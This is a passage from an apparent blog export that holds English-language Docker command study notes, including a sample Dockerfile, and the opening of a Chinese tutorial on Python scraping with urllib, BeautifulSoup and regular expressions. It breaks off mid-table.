id="check-version"><a href="#check-version" class="headerlink" title="check version"></a>check version</h4><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">[root@localhost docker]# docker version<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="list-all-the-images-in-the-local-machine"><a href="#list-all-the-images-in-the-local-machine" class="headerlink" title="list all the images in the local machine"></a>list all the images in the local machine</h4><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">[root@localhost docker]# docker images<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="search-images-on-line"><a href="#search-images-on-line" class="headerlink" title="search images on line"></a>search images on line</h4><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">[root@localhost docker]# docker search tomcat<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="download-images"><a href="#download-images" class="headerlink" title="download images"></a>download images</h4><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">[root@localhost docker]# docker pull nginx<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><code>docker pull image_name:[tag]</code> </p><p>It will download the latest version if doesn’t append <code>tag</code>. </p><h4 id="delete-images"><a href="#delete-images" class="headerlink" title="delete images"></a>delete images</h4><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">[root@localhost docker]# docker rmi redis:4.0.14<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>add <code>-f</code> can stop the executing image and delete it.</p><p><code>docker rmi -f redis:4.0.14</code></p><h4 id="create-and-start-container"><a href="#create-and-start-container" class="headerlink" title="create and start container"></a>create and start container</h4><p><code>docker run [options] image [command] [args]</code></p><p>-i: run the container in interactive mode</p><p>-t: reassigned a pseudo-input terminal for the container</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">[root@localhost docker]# docker run -it --name mycentos1 7e6257[root@da03311a5f05 &#x2F;]# lsanaconda-post.log  dev  home  lib64  mnt  proc  run   srv  tmp  varbin                etc  lib   media  opt  root  sbin  sys  usr[root@da03311a5f05 &#x2F;]# exitexit[root@localhost docker]# docker run -it --name mycentos2 7e6257[root@1be4b28c607a &#x2F;]# lsanaconda-post.log  dev  home  lib64  mnt  proc  run   srv  tmp  varbin                etc  lib   media  opt  root  sbin  sys  usr[root@1be4b28c607a &#x2F;]# exitexit<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="list-the-running-containers"><a href="#list-the-running-containers" class="headerlink" title="list the running containers"></a>list the running containers</h4><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">[root@localhost ezy]# docker psCONTAINER ID        IMAGE               COMMAND             CREATED             STATUS              PORTS               NAMESe23da60755cb        7e6257              &quot;&#x2F;bin&#x2F;bash&quot;         30 seconds ago      Up 28 seconds                           mycentos3[root@localhost ezy]# docker ps -aCONTAINER ID        IMAGE               COMMAND             CREATED             STATUS                     PORTS               NAMESe23da60755cb        7e6257              &quot;&#x2F;bin&#x2F;bash&quot;         2 minutes ago       Up 2 minutes                                   mycentos31be4b28c607a        7e6257              &quot;&#x2F;bin&#x2F;bash&quot;         4 minutes ago       Exited (0) 4 minutes ago                       mycentos2da03311a5f05        7e6257              &quot;&#x2F;bin&#x2F;bash&quot;         4 minutes ago       Exited (0) 4 minutes ago                       mycentos179dcf3b46b21        hello-world         &quot;&#x2F;hello&quot;            3 hours ago         Exited (0) 3 hours ago                         nervous_driscoll9644f1edbca7        hello-world         &quot;&#x2F;hello&quot;            3 hours ago         Exited (0) 3 hours ago                         gracious_roentgen<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>list the 2 containers that were recently created</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">[root@localhost ezy]# docker ps -n 2CONTAINER ID        IMAGE               COMMAND             CREATED             STATUS                     PORTS               NAMESe23da60755cb        7e6257              &quot;&#x2F;bin&#x2F;bash&quot;         3 minutes ago       Up 3 minutes                                   mycentos31be4b28c607a        7e6257              &quot;&#x2F;bin&#x2F;bash&quot;         5 minutes ago       Exited (0) 5 minutes ago                       mycentos2<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h4 id="exit-the-container"><a href="#exit-the-container" class="headerlink" title="exit the container"></a>exit the container</h4><p><code>exit</code> stop and exit</p><p> <code>Ctrl+P+Q</code> not stop and exit</p><h4 id="enter-into-the-container"><a href="#enter-into-the-container" class="headerlink" title="enter into the container"></a>enter into the container</h4><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">[root@localhost docker]# docker psCONTAINER ID        IMAGE               COMMAND             CREATED             STATUS              PORTS               NAMESe23da60755cb        7e6257              &quot;&#x2F;bin&#x2F;bash&quot;         8 minutes ago       Up 8 minutes                            mycentos3[root@localhost docker]# docker attach e23da[root@e23da60755cb &#x2F;]# <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="start-the-exited-container"><a href="#start-the-exited-container" class="headerlink" title="start the exited container"></a>start the exited container</h4><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">[root@localhost docker]# docker ps -aCONTAINER ID        IMAGE               COMMAND             CREATED             STATUS                      PORTS               NAMES1be4b28c607a        7e6257              &quot;&#x2F;bin&#x2F;bash&quot;         13 minutes ago      Exited (0) 13 minutes ago                       mycentos2[root@localhost docker]# docker start 1be4b28c607a1be4b28c607a[root@localhost docker]# docker psCONTAINER ID        IMAGE               COMMAND             CREATED             STATUS              PORTS               NAMES1be4b28c607a        7e6257              &quot;&#x2F;bin&#x2F;bash&quot;         14 minutes ago      Up 2 seconds                            mycentos2<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="restart-the-container"><a href="#restart-the-container" class="headerlink" title="restart the container"></a>restart the container</h4><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">[root@localhost docker]# docker restart 1be4b28c607a1be4b28c607a<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h4 id="stop-the-container"><a href="#stop-the-container" class="headerlink" title="stop the container"></a>stop the container</h4><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">[root@localhost docker]# docker stop 1be4b28c607a1be4b28c607a[root@localhost docker]# docker psCONTAINER ID        IMAGE               COMMAND             CREATED             STATUS              PORTS               NAMES<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h4 id="delete-the-container"><a href="#delete-the-container" class="headerlink" title="delete the container"></a>delete the container</h4><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">[root@localhost docker]# docker rm 1be4b28c607a1be4b28c607a<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>can add <code>-f</code> to delete forcefully </p><h2 id="Advanced-commands"><a href="#Advanced-commands" class="headerlink" title="Advanced commands"></a>Advanced commands</h2><h4 id="create-and-start-the-container-in-a-daemon-manner"><a href="#create-and-start-the-container-in-a-daemon-manner" class="headerlink" title="create and start the container in a daemon manner"></a>create and start the container in a daemon manner</h4><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">[root@localhost docker]# docker run -di --name mycentos01 7e6257c9f8d81a0d0496deffaa59b6e456db6a36b958cdc541fadf0d732291d6a1ab30bc2507[root@localhost docker]# <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>It doesn’t enter the container after startup.</p><h4 id="operate-the-container-directly-and-return-to-the-host-terminal-after-execution"><a href="#operate-the-container-directly-and-return-to-the-host-terminal-after-execution" class="headerlink" title="operate the container directly and return to the host terminal after execution"></a>operate the container directly and return to the host terminal after execution</h4><p>For example, start the application in the container, such as nginx, tomcat, etc.</p><p><code>docker exec -it ID command</code></p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">[root@localhost docker]# docker exec -it 1a0d04 ls -l &#x2F;systotal 0drwxr-xr-x.   2 root root  0 Nov 11 15:30 blockdrwxr-xr-x.  28 root root  0 Nov 11 15:30 busdrwxr-xr-x.  53 root root  0 Nov 11 15:30 classdrwxr-xr-x.   4 root root  0 Nov 11 15:30 devdrwxr-xr-x.  12 root root  0 Nov 11 15:30 devicesdrwxrwxrwt.   2 root root 40 Nov 11 15:22 firmwaredrwxr-xr-x.   7 root root  0 Nov 11 15:22 fsdrwxr-xr-x.   2 root root  0 Nov 11 15:30 hypervisordrwxr-xr-x.   9 root root  0 Nov 11 15:30 kerneldrwxr-xr-x. 185 root root  0 Nov 11 15:30 moduledrwxr-xr-x.   2 root root  0 Nov 11 15:30 power<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="check-the-logs-of-container"><a href="#check-the-logs-of-container" class="headerlink" title="check the logs of container"></a>check the logs of container</h4><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">[root@localhost docker]# docker logs 1a0d04<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="check-the-processes-of-container"><a href="#check-the-processes-of-container" class="headerlink" title="check the processes of container"></a>check the processes of container</h4><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">[root@localhost docker]# docker top 1a0d04UID                 PID                 PPID                C                   STIME               TTY                 TIME                CMDroot                81635               81619               0                   07:22               ?                   00:00:00            &#x2F;bin&#x2F;bash<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h4 id="copy-the-files-between-host-machine-and-container"><a href="#copy-the-files-between-host-machine-and-container" class="headerlink" title="copy the files between host machine and container"></a>copy the files between host machine and container</h4><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">[root@localhost docker]# docker cp &#x2F;etc&#x2F;docker&#x2F;key.json 1a0d04:&#x2F;tmp[root@localhost docker]# docker exec -it 1a0d04 ls -l &#x2F;tmptotal 8-rw-------. 1 root root 244 Nov 11 12:22 key.json[root@localhost docker]# docker cp 1a0d04:&#x2F;tmp&#x2F;key.json &#x2F;home[root@localhost docker]# ls &#x2F;homedata  ezy  key.json<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="port-mapping-between-docker-and-host"><a href="#port-mapping-between-docker-and-host" class="headerlink" title="port mapping between docker and host"></a>port mapping between docker and host</h2><p><code>docker run -it -p host:docker imageID</code></p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">[root@localhost docker]# docker run -it -p 8888:8080 e3a3935<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="submit-image"><a href="#submit-image" class="headerlink" title="submit image"></a>submit image</h2><p>save the changes and configuration in the docker and commit it into new image in the local machine</p><p><code>docker commit -a=&#39;author&#39; -m=&#39;comment&#39; ID newImageName</code></p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">[root@localhost docker]# docker commit -a &#39;ezy&#39; -m &#39;ezy01&#39; e39 ezy0812&#x2F;centos7:1.0sha256:59c3e732e8139c33cc86a2c19d3030b189ea8fd8b92c5b0cf0649a034acbfe3d[root@localhost docker]# docker imagesREPOSITORY          TAG                 IMAGE ID            CREATED             SIZEezy0812&#x2F;centos7     1.0                 59c3e732e813        3 seconds ago       203MBcentos              7                   7e6257c9f8d8        3 months ago        203MBhello-world         latest              bf756fb1ae65        10 months ago       13.3kB<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="push-the-self-made-images-to-the-hub-remote-server"><a href="#push-the-self-made-images-to-the-hub-remote-server" class="headerlink" title="push the self-made images to the hub remote server"></a>push the self-made images to the hub remote server</h2><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">[root@localhost docker]# docker login[root@localhost docker]# docker push ezy0812&#x2F;centos7<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h2 id="push-the-self-made-images-to-the-Aliyun-remote-server"><a href="#push-the-self-made-images-to-the-Aliyun-remote-server" class="headerlink" title="push the self-made images to the Aliyun remote server"></a>push the self-made images to the Aliyun remote server</h2><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">[root@localhost docker]# docker login --username&#x3D;ezy_8 registry.cn-hangzhou.aliyuncs.com[root@localhost docker]# docker imagesREPOSITORY          TAG                 IMAGE ID            CREATED             SIZEezy0812&#x2F;centos7     1.0                 59c3e732e813        12 minutes ago      203MBcentos              7                   7e6257c9f8d8        3 months ago        203MBhello-world         latest              bf756fb1ae65        10 months ago       13.3kB[root@localhost docker]# docker tag 59c3e732e813 registry.cn-hangzhou.aliyuncs.com&#x2F;ezy0812&#x2F;centos7:1.0.1[root@localhost docker]# docker imagesREPOSITORY                                          TAG                 IMAGE ID            CREATED             SIZEezy0812&#x2F;centos7                                     1.0                 59c3e732e813        13 minutes ago      203MBregistry.cn-hangzhou.aliyuncs.com&#x2F;ezy0812&#x2F;centos7   1.0.1               59c3e732e813        13 minutes ago      203MBcentos                                              7                   7e6257c9f8d8        3 months ago        203MBhello-world                                         latest              bf756fb1ae65        10 months ago       13.3kB[root@localhost docker]# docker push registry.cn-hangzhou.aliyuncs.com&#x2F;ezy0812&#x2F;centos7:1.0.1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="docker-directory-mount"><a href="#docker-directory-mount" class="headerlink" title="docker directory mount"></a>docker directory mount</h2><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">[root@localhost docker]# docker run -it -v &#x2F;home&#x2F;hdata:&#x2F;cdata 7e6257[root@localhost docker]# docker run -it -v &#x2F;home&#x2F;hdata:&#x2F;cdata -v &#x2F;home&#x2F;hdata2:&#x2F;cdata2 7e6257<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>If the mount of multiple directories has permissions denied, then add <code>--privileged=true</code></p><p>make the mount directory read-only</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">[root@localhost docker]# docker run -it -v &#x2F;home&#x2F;hdata:&#x2F;cdata:ro 7e6257<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="docker-migration-and-backup"><a href="#docker-migration-and-backup" class="headerlink" title="docker migration and backup"></a>docker migration and backup</h2><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">[root@localhost docker]# docker save -o mytomcat7.7.tar ezy0812&#x2F;tomcat:1.0 <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="Recover-on-other-machine"><a href="#Recover-on-other-machine" class="headerlink" title="Recover on other machine"></a>Recover on other machine</h4><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">[root@localhost docker]# docker load -i mytomcat7.7.tar<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="DockerFile"><a href="#DockerFile" class="headerlink" title="DockerFile"></a>DockerFile</h2><table><thead><tr><th>FROM image_name:tag</th><th>Define which base image is used to start the build process</th></tr></thead><tbody><tr><td>MAINTAINER user_info</td><td>Declare the image maintainer information</td></tr><tr><td>LABEL key value</td><td>image description meta information</td></tr><tr><td>ENV key value</td><td>set environment variable</td></tr><tr><td>RUN command</td><td>The commands to run when building the container</td></tr><tr><td>WORKDIR path_dir</td><td>set the working directory when the terminal is logged in by default</td></tr><tr><td>EXPOSE port</td><td>the port the current container is exposed to</td></tr><tr><td>ADD source_dir/file dest_dir/file</td><td>copy the file of host machine to the container, if it’s a compressed file, it can unzip after copying automatically</td></tr><tr><td>COPY source_dir/file dest_dir/file</td><td>similar to <code>ADD</code>, but if it’s a compressed file, it cannot unzip</td></tr><tr><td>VOLUME</td><td>create a mount point that can be mounted from a local host or other container, typically to hold databases, data that needs to be held, etc.</td></tr><tr><td>CMD</td><td>specify the command to run when the container starts, if there are multiple commands, then the last one work</td></tr><tr><td>ENTRYPOINT</td><td>specify the command to run when the container starts</td></tr><tr><td>ONBUILD</td><td>the command to run when building an inherited DockerFile. The ONBUILD of the parent image inherits from the parent image in the quilt image is triggered</td></tr></tbody></table><h3 id="1-write-the-DockerFile"><a href="#1-write-the-DockerFile" class="headerlink" title="1. write the DockerFile"></a>1. write the DockerFile</h3><p><code>mycentosDockerFile</code></p><pre class="line-numbers language-docker" data-language="docker"><code class="language-docker"><span class="token instruction"><span class="token keyword">FROM</span> centos</span><span class="token instruction"><span class="token keyword">MAINTAINER</span> ezy&lt;ezy0812@163.com></span><span class="token instruction"><span class="token keyword">LABEL</span> name=<span class="token string">"ezy0812 CentOS image"</span> build-date=<span class="token string">"20201112"</span></span><span class="token instruction"><span class="token keyword">ENV</span> WORKPATH /home/</span><span class="token instruction"><span class="token keyword">WORKDIR</span> <span class="token variable">$WORKPATH</span></span><span class="token instruction"><span class="token keyword">RUN</span> yum -y install net-tools</span><span class="token instruction"><span class="token keyword">RUN</span> yum -y install vim</span><span class="token instruction"><span class="token keyword">EXPOSE</span> 80</span><span class="token instruction"><span class="token keyword">CMD</span> /bin/bash</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="2-build"><a href="#2-build" class="headerlink" title="2. build"></a>2. build</h3><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">[root@localhost home]# docker build -f mycentosDockerFile -t ezy0812&#x2F;centos7:v1 .<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>pay attention to the point in the end, it’s the grammar.</p>]]></content>
      
      
      <categories>
          
          <category> Learning_Notes </category>
          
      </categories>
      
      
        <tags>
            
            <tag> docker </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python-spider</title>
      <link href="/2020/05/02/python-spider/"/>
      <url>/2020/05/02/python-spider/</url>
      
        <content type="html"><![CDATA[<p>主要介绍爬虫常用库 <code>urllib</code>, <code>bs4</code>, <code>re</code>, <code>xlwt</code>等的使用和豆瓣Top250爬取实例</p><h2 id="urllib库"><a href="#urllib库" class="headerlink" title="urllib库"></a>urllib库</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> urllib<span class="token punctuation">.</span>request<span class="token comment"># GET请求</span>response<span class="token operator">=</span>urllib<span class="token punctuation">.</span>request<span class="token punctuation">.</span>urlopen<span class="token punctuation">(</span><span class="token string">"http://www.baidu.com/"</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>response<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>              <span class="token comment">#建议使用utf-8解码，使得返回的内容更人性化的显示</span><span class="token comment"># POST请求</span><span class="token keyword">import</span> urllib<span class="token punctuation">.</span>parse                 data<span class="token operator">=</span><span class="token builtin">bytes</span><span class="token punctuation">(</span>urllib<span class="token punctuation">.</span>parse<span class="token punctuation">.</span>urlencode<span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token string">"hello"</span><span class="token punctuation">:</span><span class="token string">"world"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">,</span>encoding<span class="token operator">=</span><span class="token string">"utf-8"</span><span class="token punctuation">)</span>  <span class="token comment">#提交的表单数据并根据utf-8来编码</span>response<span class="token operator">=</span>urllib<span class="token punctuation">.</span>request<span class="token punctuation">.</span>urlopen<span class="token punctuation">(</span><span class="token string">"http://httpbin.org/post"</span><span class="token punctuation">,</span>data<span class="token operator">=</span>data<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>response<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token keyword">print</span><span class="token punctuation">(</span>response<span class="token punctuation">.</span>getheaders<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token comment">#响应头部信息</span><span class="token keyword">print</span><span class="token punctuation">(</span>response<span class="token punctuation">.</span>getheader<span class="token punctuation">(</span><span class="token string">'Server'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>     <span class="token comment">#获取头部信息内的某个键值对</span><span class="token comment"># 自定义请求头部</span>url<span class="token operator">=</span><span class="token string">"http://httpbin.org/post"</span>headers<span class="token operator">=</span><span class="token punctuation">&#123;</span>    <span class="token string">"User-Agent"</span><span class="token punctuation">:</span> <span class="token string">"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4128.3 Safari/537.36"</span><span class="token punctuation">&#125;</span>data<span class="token operator">=</span><span class="token builtin">bytes</span><span class="token punctuation">(</span>urllib<span class="token punctuation">.</span>parse<span class="token punctuation">.</span>urlencode<span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token string">"hello"</span><span class="token punctuation">:</span><span class="token string">"world"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">,</span>encoding<span class="token operator">=</span><span class="token string">"utf-8"</span><span class="token punctuation">)</span>req<span class="token operator">=</span>urllib<span class="token punctuation">.</span>request<span class="token punctuation">.</span>Request<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token punctuation">,</span>data<span class="token operator">=</span>data<span class="token punctuation">,</span>headers<span class="token operator">=</span>headers<span class="token punctuation">,</span>method<span class="token operator">=</span><span class="token string">"POST"</span><span class="token punctuation">)</span>response<span class="token operator">=</span>urllib<span class="token punctuation">.</span>request<span class="token punctuation">.</span>urlopen<span class="token punctuation">(</span>req<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>response<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="bs4库"><a href="#bs4库" class="headerlink" title="bs4库"></a>bs4库</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> bs4 <span class="token keyword">import</span> BeautifulSoup<span class="token builtin">file</span><span class="token operator">=</span><span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"./baidu.html"</span><span class="token punctuation">,</span><span class="token string">"rb"</span><span class="token punctuation">)</span>html<span class="token operator">=</span><span class="token builtin">file</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>bs<span class="token operator">=</span>BeautifulSoup<span class="token punctuation">(</span>html<span class="token punctuation">,</span><span class="token string">"html.parser"</span><span class="token punctuation">)</span>            <span class="token comment">#解析谁，用什么解析器</span><span class="token keyword">print</span><span class="token punctuation">(</span>bs<span class="token punctuation">.</span>title<span class="token punctuation">.</span>string<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>bs<span class="token punctuation">.</span>a<span class="token punctuation">.</span>attrs<span class="token punctuation">)</span>               <span class="token comment">#标签的所有属性</span><span class="token comment"># 遍历文档</span><span class="token keyword">print</span><span class="token punctuation">(</span>bs<span class="token punctuation">.</span>head<span class="token punctuation">.</span>contents<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>bs<span class="token punctuation">.</span>head<span class="token punctuation">.</span>contents<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token comment"># 搜索文档</span>t_list<span class="token operator">=</span>bs<span class="token punctuation">.</span>find_all<span class="token punctuation">(</span><span class="token string">"a"</span><span class="token punctuation">)</span><span class="token keyword">import</span> ret_list<span class="token operator">=</span>bs<span class="token punctuation">.</span>find_all<span class="token punctuation">(</span>re<span class="token punctuation">.</span><span class="token builtin">compile</span><span class="token punctuation">(</span><span class="token string">"a"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>t_list<span class="token operator">=</span>bs<span class="token punctuation">.</span>find_all<span class="token punctuation">(</span><span class="token builtin">id</span><span class="token operator">=</span><span class="token string">"mm"</span><span class="token punctuation">)</span>t_list<span class="token operator">=</span>bs<span class="token punctuation">.</span>find_all<span class="token punctuation">(</span>href<span class="token operator">=</span><span class="token string">"https://www.baidu.com/"</span><span class="token punctuation">)</span>t_list<span class="token operator">=</span>bs<span class="token punctuation">.</span>find_all<span class="token punctuation">(</span>class_<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>         <span class="token comment">#注意下划线</span>t_list<span class="token operator">=</span>bs<span class="token punctuation">.</span>find_all<span class="token punctuation">(</span>text<span class="token operator">=</span><span class="token string">"hao123"</span><span class="token punctuation">)</span>       <span class="token comment">#查找标签内容</span>t_list<span class="token operator">=</span>bs<span class="token punctuation">.</span>find_all<span class="token punctuation">(</span>text<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">"hao123"</span><span class="token punctuation">,</span><span class="token string">"地图"</span><span class="token punctuation">]</span><span class="token punctuation">)</span>t_list<span class="token operator">=</span>bs<span class="token punctuation">.</span>find_all<span class="token punctuation">(</span><span class="token string">"a"</span><span class="token punctuation">,</span>limit<span class="token operator">=</span><span class="token number">3</span><span class="token punctuation">)</span>         <span class="token comment">#前3条</span><span class="token comment"># CSS选择器</span><span class="token keyword">print</span><span class="token punctuation">(</span>bs<span class="token punctuation">.</span>select<span class="token punctuation">(</span><span class="token string">'title'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>               <span class="token comment">#通过标签查找</span><span class="token keyword">print</span><span class="token punctuation">(</span>bs<span class="token punctuation">.</span>select<span class="token punctuation">(</span><span class="token string">".classa"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>             <span class="token comment">#通过类名查找</span><span class="token keyword">print</span><span class="token punctuation">(</span>bs<span class="token punctuation">.</span>select<span class="token punctuation">(</span><span class="token string">"#id1"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>                <span class="token comment">#通过id查找</span><span class="token keyword">print</span><span class="token punctuation">(</span>bs<span class="token punctuation">.</span>select<span class="token punctuation">(</span><span class="token string">"a[class='inside-a']"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment">#通过标签的属性查找</span><span class="token keyword">print</span><span class="token punctuation">(</span>bs<span class="token punctuation">.</span>select<span class="token punctuation">(</span><span class="token string">"head > title"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token comment">#head标签里的title标签</span>t_list<span class="token operator">=</span>bs<span class="token punctuation">.</span>select<span class="token punctuation">(</span><span class="token string">".mnav ~ .bri"</span><span class="token punctuation">)</span>        <span class="token comment">#属性为.mnav的兄弟标签，即与属性为.mnav在同一级下的属性为.bri的标签</span><span class="token keyword">print</span><span class="token punctuation">(</span>t_list<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>get_text<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="re模块"><a href="#re模块" class="headerlink" title="re模块"></a>re模块</h2><table><thead><tr><th align="center">操作符</th><th align="center">说明</th><th align="center">实例</th></tr></thead><tbody><tr><td align="center">.</td><td align="center">表示任何单个字符</td><td align="center"></td></tr><tr><td align="center">[     ]</td><td align="center">字符集，对单个字符给出取值范围</td><td align="center">[abc]表示a、b、c，[a-z]表示a到z单个字符</td></tr><tr><td align="center">[^  ]</td><td align="center">非字符集，给出排除范围</td><td align="center">[^abc]表示非a、非b、非c的单个字符</td></tr><tr><td align="center">*</td><td align="center">前一个字符0次或无限次扩展</td><td align="center">abc*表示ab、abc、abcc、abccc等</td></tr><tr><td align="center">+</td><td align="center">前一个字符1次或无限次扩展</td><td align="center">abc+表示abc、abcc、abccc等</td></tr><tr><td align="center">？</td><td align="center">前一个字符0次或1次扩展</td><td align="center">abc?表示ab、abc</td></tr><tr><td align="center">|</td><td align="center">左右表达式任意一个</td><td align="center">abc|def表示abc、def</td></tr><tr><td align="center">{m}</td><td align="center">扩展前一个字符m次</td><td align="center">ab{2}c表示abbc</td></tr><tr><td align="center">{m,n}</td><td align="center">扩展前一个字符m至n次</td><td align="center">ab{1,2}c表示abc、abbc</td></tr><tr><td align="center">^</td><td align="center">匹配字符串开头</td><td align="center">^abc表示abc且在一个字符串的开头</td></tr><tr><td align="center">$</td><td align="center">匹配字符串结尾</td><td align="center">abc$表示abc且在一个字符串的结尾</td></tr><tr><td align="center">(  )</td><td align="center">分组标记，内部只能使用 | 操作符</td><td align="center">(abc)表示abc，(abc|def)表示abc、def</td></tr><tr><td align="center">\d</td><td align="center">数字，等价于[0-9]</td><td align="center"></td></tr><tr><td align="center">\w</td><td align="center">单词字符，等价于[A-Za-z0-9_] (包含下划线)</td><td align="center"></td></tr></tbody></table><table><thead><tr><th align="center">函数</th><th align="center">说明</th></tr></thead><tbody><tr><td align="center">re.search()</td><td align="center">在一个字符串中搜索匹配正则表达式的第一个位置，返回match对象</td></tr><tr><td align="center">re.match()</td><td 